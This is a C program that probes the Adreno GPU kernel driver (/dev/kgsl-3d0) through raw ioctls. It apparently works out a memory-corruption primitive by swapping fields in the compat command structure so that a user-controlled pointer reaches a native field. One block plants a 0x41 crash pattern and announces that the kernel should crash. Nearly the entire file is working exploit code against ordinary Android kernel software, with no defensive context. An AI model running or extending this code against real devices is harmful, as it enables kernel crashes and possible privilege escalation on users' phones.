#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("open: %d\n", errno); return 1; }
    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    int r = ioctl(fd, 0xc0080913, &ctx);
    printf("CREATE id=%u\n\n", ctx.id);
    if (r < 0) { close(fd); return 1; }

    struct { uint64_t ga; uint64_t sw; } ib = {0x0ULL, 0x1ULL};
    printf("ibdesc at %p\n", &ib);

    /* KEY INSIGHT:
     * Compat wrapper maps [x2+0x04] → native+0x08 (ibdesc_addr)
     *                  [x2+0x08] → native+0x10 (numibs/timestamp)
     *
     * So we PUT ibdesc ptr in [compat+0x04] and numibs-like value in [compat+0x08]!
     */
     
    printf("\n=== FIX: Swap flags<->ibdesc ===\n");
    {
        struct {
            uint32_t drawctxt_id;
            uint32_t flags;       /* PUT ibdesc ptr HERE! → goes to native+0x08 */
            uint32_t ibdesc_addr; /* small value → goes to native+0x10 (numibs-like) */
            uint32_t timestamp;   /* at +0x0C → upper 32 bits of ibdesc_addr */
            uint32_t numibs;      /* at +0x10 → goes to native+0x20 (ignored?) */
        } cmd = {
            .drawctxt_id = ctx.id,
            .flags = (uint32_t)(uintptr_t)&ib,  /* ← ibdesc ptr as FLAGS! */
            .ibdesc_addr = 1,                     /* ← numibs-like value (small) */
            .timestamp = 0,
            .numibs = 1,                          /* actual numibs (may be ignored) */
        };

        errno = 0; r = ioctl(fd, 0xc0140910, &cmd);
        printf("SWAPPED: ret=%d errno=%d (%s)\n", r, errno, r<0?strerror(errno):"OK ✅");
    }

    /* Try with crash pattern */
    printf("\n=== FIX with CRASH PATTERN ===\n");
    {
        struct { uint64_t ga; uint64_t sw; } ib2 = {
            0x0ULL,
            0x4141414141414141ULL  /* CRASH! */
        };
        struct {
            uint32_t drawctxt_id;
            uint32_t flags;       /* PUT ibdesc ptr HERE */
            uint32_t ibdesc_addr; /* small value */
            uint32_t timestamp;
            uint32_t numibs;
        } cmd = {
            .drawctxt_id = ctx.id,
            .flags = (uint32_t)(uintptr_t)&ib2,
            .ibdesc_addr = 1,
            .timestamp = 0,
            .numibs = 1,
        };

        printf("ibdesc at %p\n", &ib2);
        printf("cmd.flags=0x%08x (ibdesc ptr)\n", cmd.flags);
        printf("cmd.ibdesc_addr=%u (as numibs-like)\n", cmd.ibdesc_addr);
        errno = 0; r = ioctl(fd, 0xc0140910, &cmd);
        printf("SWAPPED+CRASH: ret=%d errno=%d (%s)\n", r, errno,
               r<0?strerror(errno):"⚠️ CFU FIRED! Kernel should crash!");
        if (r == 0) printf("  If no crash, CFU didn't hit waiter\n");
    }

    /* Also try the original layout for comparison */
    printf("\n=== Original layout (broken) ===\n");
    {
        struct {
            uint32_t drawctxt_id;
            uint32_t flags;
            uint32_t ibdesc_addr;
            uint32_t timestamp;
            uint32_t numibs;
        } cmd = {
            .drawctxt_id = ctx.id,
            .flags = 0,
            .ibdesc_addr = (uint32_t)(uintptr_t)&ib,
            .timestamp = 0,
            .numibs = 1,
        };
        errno = 0; r = ioctl(fd, 0xc0140910, &cmd);
        printf("ORIGINAL: ret=%d errno=%d (%s)\n", r, errno, r<0?strerror(errno):"❌");
    }

    ioctl(fd, 0x40040914, &ctx.id);
    close(fd);
    return 0;
}
